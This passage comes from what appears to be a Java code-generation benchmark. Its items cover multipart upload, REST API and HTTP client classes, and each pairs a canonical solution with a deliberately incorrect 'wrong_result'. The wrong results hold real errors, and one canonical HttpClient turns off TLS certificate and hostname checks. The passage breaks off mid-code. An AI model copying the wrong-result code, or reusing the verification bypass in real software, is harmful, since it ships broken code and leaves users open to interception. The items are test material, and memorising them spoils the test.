    "Canonical_solution": "import org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.web.multipart.MultipartFile;\nimport java.io.BufferedReader;\nimport java.io.Closeable;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.MalformedURLException;\nimport java.net.ProtocolException;\nimport java.net.URL;\nimport java.util.Iterator;\nimport java.util.Map;\n\npublic class HttpPostUploadUtil {\n\n    private static final Logger logger = LoggerFactory.getLogger(HttpPostUploadUtil.class);\n\n    public static String formUpload(String urlStr, int connectTimeout, int readTimeout, Map<String, String> textMap, Map<String, MultipartFile> fileMap) throws Exception {\n        String res = \"\";\n        HttpURLConnection conn = null;\n        OutputStream out = null;\n        BufferedReader reader = null;\n        String BOUNDARY = \"---------------------------123821742118716\";\n        try {\n            URL url = new URL(urlStr);\n            conn = (HttpURLConnection) url.openConnection();\n            conn.setConnectTimeout(connectTimeout);\n            conn.setReadTimeout(readTimeout);\n            conn.setDoOutput(true);\n            conn.setDoInput(true);\n            conn.setUseCaches(false);\n            conn.setRequestMethod(\"POST\");\n            conn.setRequestProperty(\"Connection\", \"Keep-Alive\");\n            conn.setRequestProperty(\"User-Agent\", \"Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.2.6)\");\n            conn.setRequestProperty(\"Content-Type\", \"multipart/form-data; boundary=\" + BOUNDARY);\n\n            out = new DataOutputStream(conn.getOutputStream());\n            if (null != textMap) {\n                StringBuffer strBuf = new StringBuffer();\n                Iterator<Map.Entry<String, String>> iter = textMap.entrySet().iterator();\n                while (iter.hasNext()) {\n                    Map.Entry<String, String> entry = iter.next();\n                    String inputName = (String) entry.getKey();\n                    String inputValue = (String) entry.getValue();\n                    if (inputValue == null) {\n                        continue;\n                    }\n                    strBuf.append(\"\\r\\n\").append(\"--\").append(BOUNDARY).append(\"\\r\\n\");\n                    strBuf.append(\"Content-Disposition: form-data; name=\\\"\" + inputName + \"\\\"\\r\\n\\r\\n\");\n                    strBuf.append(inputValue);\n                }\n                out.write(strBuf.toString().getBytes());\n            }\n\n            if (null != fileMap) {\n                Iterator<Map.Entry<String, MultipartFile>> iter = fileMap.entrySet().iterator();\n                while (iter.hasNext()) {\n                    Map.Entry<String, MultipartFile> entry = iter.next();\n                    String inputName = (String) entry.getKey();\n                    MultipartFile multipartFile = (MultipartFile) entry.getValue();\n                    if (multipartFile == null) {\n                        continue;\n                    }\n                    String fileName = multipartFile.getOriginalFilename();\n                    String contentType = multipartFile.getContentType();\n\n                    StringBuffer strBuf = new StringBuffer();\n                    strBuf.append(\"\\r\\n\").append(\"--\").append(BOUNDARY).append(\"\\r\\n\");\n                    strBuf.append(\"Content-Disposition: form-data; name=\\\"\" + inputName + \"\\\"; filename=\\\"\" + fileName + \"\\\"\\r\\n\");\n                    strBuf.append(\"Content-Type:\" + contentType + \"\\r\\n\\r\\n\");\n\n                    out.write(strBuf.toString().getBytes());\n\n                    DataInputStream in = new DataInputStream(multipartFile.getInputStream());\n                    int bytes = 0;\n                    byte[] bufferOut = new byte[1024];\n                    while ((bytes = in.read(bufferOut)) != -1) {\n                        out.write(bufferOut, 0, bytes);\n                    }\n                    in.close();\n                }\n            }\n\n            byte[] endData = (\"\\r\\n--\" + BOUNDARY + \"--\\r\\n\").getBytes();\n            out.write(endData);\n            out.flush();\n\n            StringBuffer strBuf = new StringBuffer();\n            reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            String line = null;\n            while ((line = reader.readLine()) != null) {\n                strBuf.append(line).append(\"\\n\");\n            }\n            res = strBuf.toString();\n        } catch (ProtocolException e) {\n            logger.error(\"\u4e0a\u4f20\u56fe\u7247\u5230\u670d\u52a1\u5668\u5931\u8d25\u2014>ProtocolException\", e);\n            throw new Exception(\"\u56fe\u7247\u670d\u52a1\u5668\u8fde\u63a5\u51fa\u9519\u3002\");\n        } catch (MalformedURLException e) {\n            logger.error(\"\u4e0a\u4f20\u56fe\u7247\u5230\u670d\u52a1\u5668\u5931\u8d25\u2014>MalformedURLException\", e);\n            throw new Exception(\"\u56fe\u7247\u670d\u52a1\u5668\u8fde\u63a5\u51fa\u9519\u3002\");\n        } catch (IOException e) {\n            logger.error(\"\u4e0a\u4f20\u56fe\u7247\u5230\u670d\u52a1\u5668\u5931\u8d25\u2014>IOException\", e);\n            throw new Exception(\"\u56fe\u7247\u670d\u52a1\u5668\u8fde\u63a5\u51fa\u9519\u3002\");\n        } finally {\n            closeStream(out);\n            closeStream(reader);\n            if (null != conn) {\n                conn.disconnect();\n                conn = null;\n            }\n        }\n        return res;\n    }\n\n    private static void closeStream(Closeable closeable){\n        try {\n            if (null != closeable) {\n                closeable.close();\n                closeable = null;\n            }\n        }catch (IOException e) {\n            logger.error(\"\u5173\u95ed\u8d44\u6e90\u51fa\u9519\", e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpPostUploadUtil {\n    private static final java.util.logging.Logger logger = java.util.logging.Logger.getLogger(HttpPostUploadUtil.class.getName());\n    private static final String BOUNDARY = \"----WebKitFormBoundary7MA4YWxkTrZu0gW\";\n\n    public static String formUpload(String urlStr, int connectTimeout, int readTimeout, java.util.Map<String, String> textMap, java.util.Map<String, MultipartFile> fileMap) {\n        try {\n            java.net.URL url = new java.net.URL(urlStr);\n            java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setConnectTimeout(connectTimeout);\n            conn.setReadTimeout(readTimeout);\n            conn.setDoOutput(true);\n            conn.setDoInput(true);\n            conn.setRequestProperty(\"Content-Type\", \"multipart/form-data; boundary=\" + BOUNDARY);\n\n            java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();\n            for (java.util.Map.Entry<String, String> entry : textMap.entrySet()) {\n                String fieldName = entry.getKey();\n                String fieldValue = entry.getValue();\n                baos.write((\"--\" + BOUNDARY + \"\\r\\n\").getBytes());\n                baos.write((\"Content-Disposition: form-data; name=\\\"\" + fieldName + \"\\\"\\r\\n\").getBytes());\n                baos.write(\"\\r\\n\".getBytes());\n                baos.write(fieldValue.getBytes());\n                baos.write(\"\\r\\n\".getBytes());\n            }\n            for (java.util.Map.Entry<String, MultipartFile> entry : fileMap.entrySet()) {\n                String fieldName = entry.getKey();\n                MultipartFile file = entry.getValue();\n                String fileName = file.getFileName();\n                byte[] fileBytes = file.getBytes();\n                baos.write((\"--\" + BOUNDARY + \"\\r\\n\").getBytes());\n                baos.write((\"Content-Disposition: form-data; name=\\\"\" + fieldName + \"\\\"; filename=\\\"\" + fileName + \"\\\"\\r\\n\").getBytes());\n                baos.write(\"Content-Type: application/octet-stream\\r\\n\".getBytes());\n                baos.write(\"\\r\\n\".getBytes());\n                baos.write(fileBytes);\n                baos.write(\"\\r\\n\".getBytes());\n            }\n            baos.write((\"--\" + BOUNDARY + \"--\\r\\n\").getBytes());\n            byte[] body = baos.toByteArray();\n            conn.setRequestProperty(\"Content-Length\", String.valueOf(body.length));\n            java.io.OutputStream os = conn.getOutputStream();\n            os.write(body);\n            os.flush();\n            os.close();\n\n            java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(conn.getInputStream()));\n            java.lang.StringBuilder response = new java.lang.StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.append(line);\n            }\n            reader.close();\n            return response.toString();\n        } catch (Exception e) {\n            logger.severe(\"Error during HTTP POST upload: \" + e.getMessage());\n            return null;\n        } finally {\n            closeStream(conn);\n        }\n    }\n\n    public static void closeStream(java.io.Closeable closeable) {\n        try {\n            if (closeable != null) {\n                closeable.close();\n            }\n        } catch (java.io.IOException e) {\n            logger.severe(\"Error closing stream: \" + e.getMessage());\n        }\n    }\n}"
  },
  {
    "Task_id": 96,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests (GET and POST) to a REST API, with support for custom headers, query parameters, and JSON serialization/deserialization.\n\nClass Description: The ApiHandler class provides a convenient way to make HTTP requests to a REST API endpoint. It supports both GET and POST methods, handles query parameters, includes custom headers (like API keys), and automatically serializes/deserializes JSON data using Gson. The class maintains a base URL and optional additional headers that are included in every request.\n\nAttributes:\n- baseUrl: String - The base URL for all API requests\n- additionalHeaders: Map<String, String> - Optional headers to include in all requests\n\nMethods:\n- Constructor: ApiHandler(String url) - Initializes the handler with a base URL\n- Constructor: ApiHandler(String url, String apiKey) - Initializes with base URL and sets an API key header\n- get: <T> get(String endpoint, Class<T> tClass) -> T - Makes a GET request to the endpoint and returns deserialized response\n- get: <T> get(String endpoint, HashMap<String, Object> query, Class<T> tClass) -> T - Makes a GET request with query parameters\n- post: <T> post(String endpoint, T body, Class<T> tClass) -> T - Makes a POST request with a request body\n- post: <T> post(String endpoint, HashMap<String, Object> query, T body, Class<T> tClass) -> T - Makes a POST request with query parameters and body\n- getRaw: static String getRaw(Map<String, String> headers, String url) -> String - Makes a raw GET request and returns response as string\n- postRaw: static String postRaw(Map<String, String> headers, String url, String body) -> String - Makes a raw POST request and returns response as string\n- addHeaders: static void addHeaders(HttpURLConnection connection, Map<String, String> headers) - Helper to add headers to a connection\n- parseQueries: static String parseQueries(HashMap<String, Object> query) -> String - Converts query parameters to URL encoded string\n- getFullUrl: static <T> T getFullUrl(Map<String, String> headers, String url, Class<T> tClass) -> T - Makes GET request to full URL and deserializes response\n- getFullUrl: static <T> T getFullUrl(Map<String, String> headers, String url, HashMap<String, Object> query, Class<T> tClass) -> T - GET with query params to full URL\n- postFullUrl: static <T> T postFullUrl(Map<String, String> headers, String url, T body, Class<T> tClass) -> T - POST to full URL with body\n- postFullUrl: static <T> T postFullUrl(Map<String, String> headers, String url, HashMap<String, Object> query, T body, Class<T> tClass) -> T - POST with query params to full URL\n- urlEncodeUTF8: static String urlEncodeUTF8(String input) -> String - URL encodes a string using UTF-8",
    "Canonical_solution": "import android.util.ArrayMap;\nimport android.util.Log;\nimport com.google.gson.Gson;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.io.UnsupportedEncodingException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.URLEncoder;\nimport java.nio.charset.StandardCharsets;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.Objects;\n\npublic class ApiHandler {\n    public final String baseUrl;\n    public final Map<String, String> additionalHeaders;\n\n    public ApiHandler(String url) {\n        baseUrl = url;\n        additionalHeaders = null;\n    }\n\n    public ApiHandler(String url, String apiKey) {\n        baseUrl = url;\n        additionalHeaders = new ArrayMap<>();\n        additionalHeaders.put(\"x-api-key\", apiKey);\n    }\n\n    public <T> T get(String endpoint, Class<T> tClass) {\n        return getFullUrl(additionalHeaders, baseUrl + \"/\" + endpoint, tClass);\n    }\n\n    public <T> T get(String endpoint, HashMap<String, Object> query, Class<T> tClass) {\n        return getFullUrl(additionalHeaders, baseUrl + \"/\" + endpoint, query, tClass);\n    }\n\n    public <T> T post(String endpoint, T body, Class<T> tClass) {\n        return postFullUrl(additionalHeaders, baseUrl + \"/\" + endpoint, body, tClass);\n    }\n\n    public <T> T post(String endpoint, HashMap<String, Object> query, T body, Class<T> tClass) {\n        return postFullUrl(additionalHeaders, baseUrl + \"/\" + endpoint, query, body, tClass);\n    }\n\n    public static String getRaw(Map<String, String> headers, String url) {\n        Log.d(\"ApiHandler\", url);\n        try {\n            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();\n            addHeaders(conn, headers);\n            InputStream inputStream = conn.getInputStream();\n            String data = Tools.read(inputStream);\n            Log.d(ApiHandler.class.toString(), data);\n            inputStream.close();\n            conn.disconnect();\n            return data;\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return null;\n    }\n\n    public static String postRaw(Map<String, String> headers, String url, String body) {\n        try {\n            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setRequestProperty(\"Content-Type\", \"application/json\");\n            conn.setRequestProperty(\"Accept\", \"application/json\");\n            addHeaders(conn, headers);\n            conn.setDoOutput(true);\n\n            OutputStream outputStream = conn.getOutputStream();\n            byte[] input = body.getBytes(StandardCharsets.UTF_8);\n            outputStream.write(input, 0, input.length);\n            outputStream.close();\n\n            InputStream inputStream = conn.getInputStream();\n            String data = Tools.read(inputStream);\n            inputStream.close();\n\n            conn.disconnect();\n            return data;\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return null;\n    }\n\n    private static void addHeaders(HttpURLConnection connection, Map<String, String> headers) {\n        if(headers != null) {\n            for(String key : headers.keySet())\n                connection.addRequestProperty(key, headers.get(key));\n        }\n    }\n\n    private static String parseQueries(HashMap<String, Object> query) {\n        StringBuilder params = new StringBuilder(\"?\");\n        for (String param : query.keySet()) {\n            String value = Objects.toString(query.get(param));\n            params.append(urlEncodeUTF8(param))\n                    .append(\"=\")\n                    .append(urlEncodeUTF8(value))\n                    .append(\"&\");\n        }\n        return params.substring(0, params.length() - 1);\n    }\n\n    public static <T> T getFullUrl(Map<String, String> headers, String url, Class<T> tClass) {\n        return new Gson().fromJson(getRaw(headers, url), tClass);\n    }\n\n    public static <T> T getFullUrl(Map<String, String> headers, String url, HashMap<String, Object> query, Class<T> tClass) {\n        return getFullUrl(headers, url + parseQueries(query), tClass);\n    }\n\n    public static <T> T postFullUrl(Map<String, String> headers, String url, T body, Class<T> tClass) {\n        return new Gson().fromJson(postRaw(headers, url, body.toString()), tClass);\n    }\n\n    public static <T> T postFullUrl(Map<String, String> headers, String url, HashMap<String, Object> query, T body, Class<T> tClass) {\n        return new Gson().fromJson(postRaw(headers, url + parseQueries(query), body.toString()), tClass);\n    }\n\n    private static String urlEncodeUTF8(String input) {\n        try {\n            return URLEncoder.encode(input, \"UTF-8\");\n        }catch (UnsupportedEncodingException e) {\n            throw new RuntimeException(\"UTF-8 is required\");\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class ApiHandler {\n    private String baseUrl;\n    private Map<String, String> additionalHeaders;\n    private static final Gson gson = new Gson();\n\n    public ApiHandler(String url) {\n        this.baseUrl = url;\n        this.additionalHeaders = new HashMap<>();\n    }\n\n    public ApiHandler(String url, String apiKey) {\n        this.baseUrl = url;\n        this.additionalHeaders = new HashMap<>();\n        this.additionalHeaders.put(\"Authorization\", \"Bearer \" + apiKey);\n    }\n\n    public <T> T get(String endpoint, Class<T> tClass) {\n        String fullUrl = baseUrl + endpoint;\n        return getFullUrl(additionalHeaders, fullUrl, tClass);\n    }\n\n    public <T> T get(String endpoint, HashMap<String, Object> query, Class<T> tClass) {\n        String fullUrl = baseUrl + endpoint;\n        if (query != null && !query.isEmpty()) {\n            String queryString = parseQueries(query);\n            fullUrl += \"?\" + queryString;\n        }\n        return getFullUrl(additionalHeaders, fullUrl, tClass);\n    }\n\n    public <T> T post(String endpoint, T body, Class<T> tClass) {\n        String fullUrl = baseUrl + endpoint;\n        return postFullUrl(additionalHeaders, fullUrl, body, tClass);\n    }\n\n    public <T> T post(String endpoint, HashMap<String, Object> query, T body, Class<T> tClass) {\n        String fullUrl = baseUrl + endpoint;\n        if (query != null && !query.isEmpty()) {\n            String queryString = parseQueries(query);\n            fullUrl += \"?\" + queryString;\n        }\n        return postFullUrl(additionalHeaders, fullUrl, body, tClass);\n    }\n\n    public static String getRaw(Map<String, String> headers, String url) {\n        try {\n            URL obj = new URL(url);\n            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();\n            addHeaders(conn, headers);\n            conn.setRequestMethod(\"GET\");\n            conn.setConnectTimeout(5000);\n            conn.setReadTimeout(5000);\n            int responseCode = conn.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n                StringBuilder response = new StringBuilder();\n                String inputLine;\n                while ((inputLine = in.readLine()) != null) {\n                    response.append(inputLine);\n                }\n                in.close();\n                return response.toString();\n            } else {\n                return \"\";\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n            return \"\";\n        }\n    }\n\n    public static String postRaw(Map<String, String> headers, String url, String body) {\n        try {\n            URL obj = new URL(url);\n            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();\n            addHeaders(conn, headers);\n            conn.setRequestMethod(\"POST\");\n            conn.setDoOutput(true);\n            conn.setConnectTimeout(5000);\n            conn.setReadTimeout(5000);\n            conn.setRequestProperty(\"Content-Type\", \"application/json\");\n            try (OutputStream os = conn.getOutputStream()) {\n                byte[] input = body.getBytes(\"utf-8\");\n                os.write(input, 0, input.length);\n            }\n            int responseCode = conn.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n                StringBuilder response = new StringBuilder();\n                String inputLine;\n                while ((inputLine = in.readLine()) != null) {\n                    response.append(inputLine);\n                }\n                in.close();\n                return response.toString();\n            } else {\n                return \"\";\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n            return \"\";\n        }\n    }\n\n    public static void addHeaders(HttpURLConnection connection, Map<String, String> headers) {\n        if (headers != null) {\n            for (Map.Entry<String, String> entry : headers.entrySet()) {\n                connection.setRequestProperty(entry.getKey(), entry.getValue());\n            }\n        }\n    }\n\n    public static String parseQueries(HashMap<String, Object> query) {\n        StringBuilder sb = new StringBuilder();\n        for (Map.Entry<String, Object> entry : query.entrySet()) {\n            String key = entry.getKey();\n            Object value = entry.getValue();\n            if (value != null) {\n                if (sb.length() > 0) {\n                    sb.append(\"&\");\n                }\n                sb.append(urlEncodeUTF8(key));\n                sb.append(\"=\");\n                sb.append(urlEncodeUTF8(value.toString()));\n            }\n        }\n        return sb.toString();\n    }\n\n    public static String urlEncodeUTF8(String input) {\n        try {\n            return URLEncoder.encode(input, \"UTF-8\");\n        } catch (UnsupportedEncodingException e) {\n            e.printStackTrace();\n            return input;\n        }\n    }\n\n    public static <T> T getFullUrl(Map<String, String> headers, String url, Class<T> tClass) {\n        String response = getRaw(headers, url);\n        return deserialize(response, tClass);\n    }\n\n    public static <T> T getFullUrl(Map<String, String> headers, String url, HashMap<String, Object> query, Class<T> tClass) {\n        String queryString = parseQueries(query);\n        String fullUrl = url + (queryString.isEmpty() ? \"\" : \"?\" + queryString);\n        return getFullUrl(headers, fullUrl, tClass);\n    }\n\n    public static <T> T postFullUrl(Map<String, String> headers, String url, T body, Class<T> tClass) {\n        String jsonBody = serialize(body);\n        String response = postRaw(headers, url, jsonBody);\n        return deserialize(response, tClass);\n    }\n\n    public static <T> T postFullUrl(Map<String, String> headers, String url, HashMap<String, Object> query, T body, Class<T> tClass) {\n        String queryString = parseQueries(query);\n        String fullUrl = url + (queryString.isEmpty() ? \"\" : \"?\" + queryString);\n        String jsonBody = serialize(body);\n        return postFullUrl(headers, fullUrl, body, tClass);\n    }\n\n    private static <T> T deserialize(String json, Class<T> clazz) {\n        return gson.fromJson(json, clazz);\n    }\n\n    private static String serialize(Object obj) {\n        return gson.toJson(obj);\n    }\n}"
  },
  {
    "Task_id": 97,
    "Instruction": "Task Description: Implement a Java class that provides remote service capabilities for retrieving knowledge packages from a repository server using HTTP communication.\n\nClass Description: RemoteServiceImpl is a service class that handles HTTP communication with a remote repository server to fetch knowledge packages. It manages the connection, request/response handling, and data processing.\n\nAttributes:\n- resporityServerUrl: String - The base URL of the remote repository server\n- log: Logger - Logger instance for logging information and errors\n\nMethods:\n- getKnowledge(String packageId, String timestamp) -> KnowledgePackage - Retrieves a knowledge package from the remote server using the specified package ID and timestamp\n- sendRequest(String packageId, String timestamp) -> String - Internal method that handles the HTTP request/response cycle with the remote server\n- setResporityServerUrl(String resporityServerUrl) -> void - Sets the repository server URL, appending the default endpoint if not present",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\nimport java.util.logging.Logger;\n\nimport org.apache.commons.lang.StringUtils;\n\nimport com.bstek.urule.RuleException;\nimport com.bstek.urule.Utils;\nimport com.bstek.urule.model.flow.FlowDefinition;\nimport com.bstek.urule.model.rete.JsonUtils;\nimport com.bstek.urule.runtime.KnowledgePackage;\nimport com.bstek.urule.runtime.KnowledgePackageWrapper;\n\npublic class RemoteServiceImpl implements RemoteService {\n    private String resporityServerUrl;\n    private Logger log = Logger.getLogger(RemoteServiceImpl.class.getName());\n\n    public KnowledgePackage getKnowledge(String packageId, String timestamp) {\n        if(StringUtils.isEmpty(resporityServerUrl)){\n            return null;\n        }\n        log.info(\"Load knowledgepackage from remote...\");\n        String content = sendRequest(packageId, timestamp);\n        if(StringUtils.isEmpty(content)){\n            return null;\n        }\n        KnowledgePackageWrapper wrapper = JsonUtils.parseKnowledgePackageWrapper(content);\n        KnowledgePackage knowledgePackage = wrapper.getKnowledgePackage();\n        Map<String, FlowDefinition> flowMap = knowledgePackage.getFlowMap();\n        if(flowMap != null && flowMap.size() > 0){\n            for(FlowDefinition fd : flowMap.values()){\n                fd.buildConnectionToNode();\n            }\n        }\n        return knowledgePackage;\n    }\n\n    private String sendRequest(String packageId, String timestamp) {\n        HttpURLConnection connection = null;\n        OutputStreamWriter writer = null;\n        InputStream inputStream = null;\n        InputStreamReader inputStreamReader = null;\n        BufferedReader bufferedReader = null;\n        try {\n            packageId = Utils.encodeURL(packageId);\n            packageId = Utils.encodeURL(packageId);\n            String content = \"packageId=\" + packageId + \"\";\n            if(StringUtils.isNotEmpty(timestamp)){\n                content += \"&timestamp=\" + timestamp + \"\";\n            }\n            URL url = new URL(resporityServerUrl);\n            connection = (HttpURLConnection)url.openConnection();\n            connection.setRequestMethod(\"POST\");\n            connection.setRequestProperty(\"Accept-Charset\", \"utf-8\");\n            connection.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n            connection.setRequestProperty(\"Content-Length\", String.valueOf(content.length()));\n            connection.setUseCaches(false);\n            connection.setDoOutput(true);\n            connection.connect();\n            writer = new OutputStreamWriter(connection.getOutputStream());\n            writer.write(content);\n            writer.flush();\n            if (connection.getResponseCode() != 200) {\n                throw new RuleException(\"Server request was failed, Response message : \" + connection.getResponseMessage());\n            }\n            inputStream = connection.getInputStream();\n            inputStreamReader = new InputStreamReader(inputStream,\"utf-8\");\n            bufferedReader = new BufferedReader(inputStreamReader);\n            String line = null;\n            StringBuilder sb = new StringBuilder();\n            while ((line = bufferedReader.readLine()) != null) {\n                sb.append(line);\n            }\n            return sb.toString();\n        } catch (Exception e) {\n            throw new RuleException(e);\n        } finally {\n            try {\n                if(writer != null){\n                    writer.close();\n                }\n                if(bufferedReader != null){\n                    bufferedReader.close();\n                }\n                if(inputStreamReader != null){\n                    inputStreamReader.close();\n                }\n                if(inputStream != null){\n                    inputStream.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            if(connection != null){\n                connection.disconnect();\n            }\n        }\n    }\n\n    public void setResporityServerUrl(String resporityServerUrl) {\n        if(StringUtils.isEmpty(resporityServerUrl) || resporityServerUrl.equals(\"urule.resporityServerUrl\")){\n            return;\n        }\n        if(resporityServerUrl.endsWith(\"/\")){\n            resporityServerUrl += \"urule/loadknowledge\";\n        }else{\n            resporityServerUrl += \"/urule/loadknowledge\";\n        }\n        this.resporityServerUrl = resporityServerUrl;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class RemoteServiceImpl {\n    private String repositoryServerUrl;\n    private Logger log;\n\n    public RemoteServiceImpl(Logger log) {\n        this.log = log;\n    }\n\n    public void setResporityServerUrl(String resporityServerUrl) {\n        if (resporityServerUrl == null) {\n            this.repositoryServerUrl = null;\n            return;\n        }\n        String defaultEndpoint = \"/knowledge\";\n        if (!resporityServerUrl.endsWith(\"/\")) {\n            resporityServerUrl += \"/\";\n        }\n        if (!resporityServerUrl.endsWith(defaultEndpoint)) {\n            this.repositoryServerUrl = resporityServerUrl + defaultEndpoint;\n        } else {\n            this.repositoryServerUrl = resporityServerUrl;\n        }\n    }\n\n    private String sendRequest(String packageId, String timestamp) {\n        try {\n            String url = repositoryServerUrl + \"?packageId=\" + URLEncoder.encode(packageId, \"UTF-8\") + \"&timestamp=\" + URLEncoder.encode(timestamp, \"UTF-8\");\n            log.info(\"Sending request to: \" + url);\n            URL requestUrl = new URL(url);\n            HttpURLConnection connection = (HttpURLConnection) requestUrl.openConnection();\n            connection.setRequestMethod(\"GET\");\n            connection.setConnectTimeout(5000);\n            connection.setReadTimeout(5000);\n            int responseCode = connection.getResponseCode();\n            log.info(\"Response code: \" + responseCode);\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n                StringBuilder response = new StringBuilder();\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    response.append(line);\n                }\n                reader.close();\n                return response.toString();\n            } else {\n                log.error(\"Failed to retrieve knowledge package. Response code: \" + responseCode);\n                return null;\n            }\n        } catch (Exception e) {\n            log.error(\"Error during HTTP request\", e);\n            return null;\n        }\n    }\n\n    public KnowledgePackage getKnowledge(String packageId, String timestamp) {\n        String response = sendRequest(packageId, timestamp);\n        if (response == null) {\n            return null;\n        }\n        return new KnowledgePackage(response);\n    }\n}"
  },
  {
    "Task_id": 98,
    "Instruction": "Task Description: Create a Java HTTP client class that handles HTTP/HTTPS requests with support for proxies, custom headers, cookies, and request body configuration. The class should manage SSL verification, connection timeouts, and proper resource cleanup.\n\nClass Description: The HttpClient class provides functionality to send HTTP requests and receive responses. It handles SSL certificate verification (with optional bypass), proxy configuration, request customization, and response processing. The class maintains static configuration and includes utility methods for connection management.\n\nAttributes:\n\nconfig: [Config] - Singleton instance holding configuration settings like proxy information and cookie names\n\nMethods:\n\nsendRequest: [sendRequest]([HttpRequestInfo httpRequestInfo, String cookieValue]) -> [String] - Main method to send HTTP requests. Takes request info and cookie value, returns response body as string or null on failure.\n\ncreateConnection: [createConnection]([HttpRequestInfo httpRequestInfo]) -> [HttpURLConnection] - Creates and returns a connection object, optionally through a proxy if configured.\n\nconfigureRequest: [configureRequest]([HttpURLConnection connection, HttpRequestInfo httpRequestInfo, String cookieValue]) -> [void] - Configures request method, headers, and cookies on the connection object.\n\nconfigureCookie: [configureCookie]([Map<String,String> headers, String cookieValue]) -> [void] - Handles cookie manipulation in request headers.\n\nsendRequestBody: [sendRequestBody]([HttpURLConnection connection, HttpRequestInfo httpRequestInfo]) -> [void] - Sends request body data if present in the request info.\n\ncloseResources: [closeResources]([HttpURLConnection connection, InputStream inputStream, ByteArrayOutputStream baos]) -> [void] - Safely closes all connection-related resources.",
    "Canonical_solution": "import javax.net.ssl.*;\nimport java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.InetSocketAddress;\nimport java.net.Proxy;\nimport java.net.URL;\nimport java.security.KeyManagementException;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class HttpClient {\n    private static Config config = Config.getInstance();\n\n    static {\n        try {\n            SSLContext sslcontext = SSLContext.getInstance(\"SSL\");\n            sslcontext.init(null, new TrustManager[]{new MyX509TrustManager()}, null);\n            HostnameVerifier ignoreHostnameVerifier = (s, sslsession) -> true;\n            HttpsURLConnection.setDefaultHostnameVerifier(ignoreHostnameVerifier);\n            HttpsURLConnection.setDefaultSSLSocketFactory(sslcontext.getSocketFactory());\n        } catch (NoSuchAlgorithmException | KeyManagementException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static String sendRequest(HttpRequestInfo httpRequestInfo, String cookieValue) {\n        HttpURLConnection connection = null;\n        InputStream inputStream = null;\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        try {\n            connection = createConnection(httpRequestInfo);\n            configureRequest(connection, httpRequestInfo, cookieValue);\n            sendRequestBody(connection, httpRequestInfo);\n\n            connection.setConnectTimeout(20000);\n            connection.setReadTimeout(20000);\n            connection.connect();\n\n            inputStream = connection.getInputStream();\n            if (inputStream.available() > 0) {\n                byte[] buffer = new byte[inputStream.available()];\n                inputStream.read(buffer);\n                baos.write(buffer, 0, buffer.length);\n            }\n        } catch (Exception e) {\n            return null;\n        } finally {\n            closeResources(connection, inputStream, baos);\n        }\n        return baos.toString();\n    }\n\n    private static HttpURLConnection createConnection(HttpRequestInfo httpRequestInfo) throws IOException {\n        if (config.isProxyEnabled()) {\n            Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(config.getProxyIP(), config.getProxyPort()));\n            return (HttpURLConnection) new URL(httpRequestInfo.getRequestURL()).openConnection(proxy);\n        } else {\n            return (HttpURLConnection) new URL(httpRequestInfo.getRequestURL()).openConnection();\n        }\n    }\n\n    private static void configureRequest(HttpURLConnection connection, HttpRequestInfo httpRequestInfo, String cookieValue) {\n        connection.setRequestMethod(httpRequestInfo.getRequestMethod());\n        Map<String, String> headers = new HashMap<>();\n        if (httpRequestInfo.getHeaders().size() > 0) {\n            headers.putAll(httpRequestInfo.getHeaders());\n        } else {\n            headers.put(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36\");\n        }\n        configureCookie(headers, cookieValue);\n        headers.forEach(connection::setRequestProperty);\n        connection.setRequestProperty(\"connection\", \"close\");\n    }\n\n    private static void configureCookie(Map<String, String> headers, String cookieValue) {\n        String cookie = headers.get(\"Cookie\");\n        if (cookie == null) {\n            headers.put(\"Cookie\", 